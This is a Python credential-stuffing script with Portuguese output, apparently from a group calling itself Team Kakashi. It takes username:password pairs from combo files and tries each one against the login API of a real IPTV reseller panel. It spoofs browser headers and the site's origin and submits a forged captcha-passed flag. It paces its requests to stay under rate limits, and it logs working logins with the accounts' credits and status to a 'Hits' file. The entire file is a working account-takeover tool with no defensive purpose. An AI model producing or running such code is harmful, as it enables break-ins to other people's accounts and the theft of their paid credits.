import requests
import json
import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from datetime import datetime
from colorama import init, Fore, Style
import os
import sys
import time

# Inicializa o Colorama
init(autoreset=True)

# Configuração para evitar warnings de SSL
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)
NAME = 'PAINEL NEWMAS TOP'
sys.stdout.write(f"\033]2;{NAME}\007")

if not os.path.exists('/sdcard/Hits/'):
    os.makedirs('/sdcard/Hits/')     

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    clear()
    print(Fore.CYAN + '''
      █▄░█ █▀▀ █░█░█ █▀▄▀█ ▄▀█ █▀     
      █░▀█ ██▄ ▀▄▀▄▀ █░▀░█ █▀█ ▄█         
    
        Cѳ∂¡gѳ Բ૯¡τѳ Pѳ૨ @MaxkakashiBr         
  ''')

def formatar_data(data_str):
    """Converte a string de data para o formato DD-MM-AAAA."""
    data = datetime.strptime(data_str, "%Y-%m-%dT%H:%M:%S.%fZ")
    return data.strftime("%d-%m-%Y")

def salvar_login(result, username, password):
    """Salva os logins válidos em um arquivo de texto."""
    caminho = "/sdcard/Hits/LOGINS-PAINEL[NEWMAS-TOP].txt"
    os.makedirs(os.path.dirname(caminho), exist_ok=True)  # Cria a pasta caso não exista
    
    with open(caminho, "a") as arquivo:
        arquivo.write("╔══[▐▐ 𝐏𝐀𝐈𝐍𝐄𝐋 𝐍𝐄𝐖𝐌𝐀𝐒▐▐ ]══\n")
        arquivo.write(f"║∘Painel ➨ {result['panel_url']}\n")
        arquivo.write(f"║∘Usuario ➨ {username}\n")
        arquivo.write(f"║∘Senha ➨ {password}\n")
        arquivo.write(f"║∘Criado em ➨ {formatar_data(result['created_at'])}\n")
        arquivo.write(f"║∘Atualizado em ➨ {formatar_data(result['updated_at'])}\n")
        arquivo.write(f"║∘Creditos ➨ {result['credits']}\n")
        arquivo.write(f"║∘Status ➨ {result['status']}\n")
        arquivo.write("╚══┃▐▐ ❝ 𝐓𝐞𝐚𝐦 𝐊𝐚𝐤𝐚𝐬𝐡𝐢 ❞▐▐ ┃═══\n\n")

def verificar_usuario(username, password):
    url = "https://painel.newmais.top/api/auth/login"
    headers = {
        "Host": "painel.newmais.top",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Locale": "pt",
        "sec-ch-ua": '"Chromium";v="122", "Opera";v="108", " Not A;Brand";v="99", "OperaMobile";v="81"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; 23129RA5FL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.149 Mobile Safari/537.36 OPR/81.6.4292.79147",
        "Origin": "https://fsplayy.top",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://fsplayy.top/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "pt-BR,pt;q=0.9,en-us;q=0.8,en;q=0.7"
    }
    
    data = {
        "captcha": "not-a-robot",
        "captchaChecked": True,
        "username": username,
        "password": password,
        "twofactor_code": "",
        "twofactor_recovery_code": "",
        "twofactor_trusted_device_id": ""
    }

    response = requests.post(url, headers=headers, json=data)

    if response.status_code == 200:
        result = response.json()
        if "id" in result:
            print(Fore.GREEN + "Usuário e senha válidos!")
            print(Fore.GREEN + "╔══[▐▐ 𝐏𝐀𝐈𝐍𝐄𝐋 𝐍𝐄𝐖𝐌𝐀𝐒▐▐ ]══  ")
            print(Fore.GREEN + f"║∘Painel ➨ {result['panel_url']} ")
            print(Fore.GREEN + f"║∘Usuario ➨ {username} ")
            print(Fore.GREEN + f"║∘Senha ➨ {password} ")
            print(Fore.GREEN + f"║∘Criado em ➨ {formatar_data(result['created_at'])}  ")
            print(Fore.GREEN + f"║∘Atualizado em ➨ {formatar_data(result['updated_at'])}  ")
            print(Fore.GREEN + f"║∘Creditos ➨ {result['credits']}  ")
            print(Fore.GREEN + f"║∘Status ➨ {result['status']}  ")
            print(Fore.GREEN + "╚══┃▐▐ ❝ 𝐓𝐞𝐚𝐦 𝐊𝐚𝐤𝐚𝐬𝐡𝐢 ❞▐▐ ┃═══\n  ")
            
            salvar_login(result, username, password)
        else:
            print(Fore.RED + "Usuário ou senha inválidos!")
    elif response.status_code == 429:
        print(Fore.RED + "\n╔══[▐▐ 𝐏𝐀𝐈𝐍𝐄𝐋 𝐍𝐄𝐖𝐌𝐀𝐒▐▐ ]══  ")
        print(Fore.RED + f"║∘Painel ➨ https://fsplayy.top ")
        print(Fore.RED + f"║∘Usuario ➨ {username} ")
        print(Fore.RED + f"║∘Senha ➨ {password} ")
        print(Fore.RED + f"║∘Status ➨ [ 429 IP 📵 ]  ")
        print(Fore.RED + "╚══┃▐▐ ❝ 𝐓𝐞𝐚𝐦 𝐊𝐚𝐤𝐚𝐬𝐡𝐢 ❞▐▐ ┃═══  " + Style.RESET_ALL)
    else:
        print(Fore.RED + "\n╔══[▐▐ 𝐏𝐀𝐈𝐍𝐄𝐋 𝐍𝐄𝐖𝐌𝐀𝐒▐▐ ]══ ")
        print(Fore.RED + f"║∘Painel ➨ https://fsplayy.top  ")
        print(Fore.RED + f"║∘Usuario ➨ {username}  ")
        print(Fore.RED + f"║∘Senha ➨ {password} ")
        print(Fore.RED + f"║∘Status ➨ [ {response.status_code} ]  ")
        print(Fore.RED + "╚══┃▐▐ ❝ 𝐓𝐞𝐚𝐦 𝐊𝐚𝐤𝐚𝐬𝐡𝐢 ❞▐▐ ┃═══" + Style.RESET_ALL)

def verificar_usuario_com_reconexao(username, password):
    """Verifica o usuário e trata erros de conexão."""
    while True:
        try:
            verificar_usuario(username, password)
            break
        except requests.exceptions.RequestException as e:
            print(Fore.YELLOW + f" Tentando reconectar...")
            time.sleep(3)

def selecionar_combo():
    clear()
    banner()
    caminho = "/sdcard/Combo/"
    arquivos = [f for f in os.listdir(caminho) if os.path.isfile(os.path.join(caminho, f))]
    
    print(Fore.RED + "Selecione um arquivo de combo:")
    for idx, arquivo in enumerate(arquivos):
        print(Fore.GREEN + f"{idx + 1}. {arquivo}")
    
    escolha = int(input(Fore.RED + "Digite o número do arquivo que deseja usar: ")) - 1
    
    if 0 <= escolha < len(arquivos):
        arquivo_selecionado = os.path.join(caminho, arquivos[escolha])
        return arquivo_selecionado
    else:
        print("Escolha inválida. Tente novamente.")
        return selecionar_combo()

def processar_combo(caminho_combo):
    """Processa o arquivo de combo, verificando cada login."""
    contagem = 0
    with open(caminho_combo, "r") as arquivo:
        for linha in arquivo:
            partes = linha.strip().split(":")
            if len(partes) == 2:
                username, password = partes
                verificar_usuario_com_reconexao(username, password)
                
                contagem += 1
                
                time.sleep(2)
                
                if contagem % 5 == 0:
                    time.sleep(5)

# Seleciona o combo e processa
caminho_combo = selecionar_combo()
processar_combo(caminho_combo)

# Mensagem final
print(Fore.YELLOW + "\n\nS८αทท૯๒ Cѳท૮ℓષ¡∂ѳ\n\nCѳ∂¡gѳ Բ૯¡τѳ Pѳ૨ @MaxkakashiBr")
